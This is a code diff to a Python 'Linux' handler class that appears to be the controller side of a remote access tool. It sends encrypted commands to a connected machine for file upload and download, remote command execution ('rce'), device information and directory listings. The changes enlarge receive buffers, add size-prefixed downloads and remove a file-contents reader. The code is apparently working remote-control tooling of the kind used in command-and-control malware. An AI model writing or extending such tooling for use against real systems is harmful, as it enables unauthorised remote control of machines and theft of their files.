@@ -42,7 +42,7 @@ class Linux(BaseHandler):
         self.conn.send(self.encrypt(f"file-u:{remote_path}"))
         time.sleep(1)
         self.conn.sendfile(local_file)
-        output = self.decrypt(self.conn.recv(1024))
+        output = self.decrypt(self.conn.recv(8192))
         if output.startswith("!"):
             raise Exception("File Upload Failed")
         else:
@@ -50,7 +50,10 @@ class Linux(BaseHandler):
 
     def file_download(self, remote_path:str) -> io.TextIOWrapper:
         self.conn.send(self.encrypt(f"file-d:{remote_path}"))
-        file = self.conn.recv(1024)
+        size = self.decrypt(self.conn.recv(16384))
+        if size.startswith("!"):
+            raise Exception("Couldn't download the File")
+        file = self.conn.recv(int(size))
         if file.startswith("!"):
             raise Exception("Couldn't download the File")
         else:
@@ -58,7 +61,7 @@ class Linux(BaseHandler):
 
     def rce(self, cmd:str) -> str:
         self.conn.send(self.encrypt(f"cmd:{cmd}"))
-        output = self.decrypt(self.conn.recv(1024))
+        output = self.decrypt(self.conn.recv(8192))
         return output
 
     def infos(self) -> str:
@@ -68,21 +71,13 @@ class Linux(BaseHandler):
             str: Infos about the Device
         """
         self.conn.send(self.encrypt(f"infos:"))
-        output = self.decrypt(self.conn.recv(1024))
+        output = self.decrypt(self.conn.recv(8192))
         return output
 
     def get_directory_contents(self, dir:str) -> str:
         self.conn.send(self.encrypt(f"dir:{dir}"))
-        output = self.decrypt(self.conn.recv(1024))
+        output = self.decrypt(self.conn.recv(8192))
         if output.startswith("!"):
             raise Exception("Couldn't get the Directory")
-        else:
-            return output
-
-    def get_file_contents(self, path:str) -> str:
-        self.conn.send(self.encrypt(f"content:{path}"))
-        output = self.decrypt(self.conn.recv(1024))
-        if output.startswith("!"):
-            raise Exception("Couldn't get the File")
         else:
             return output
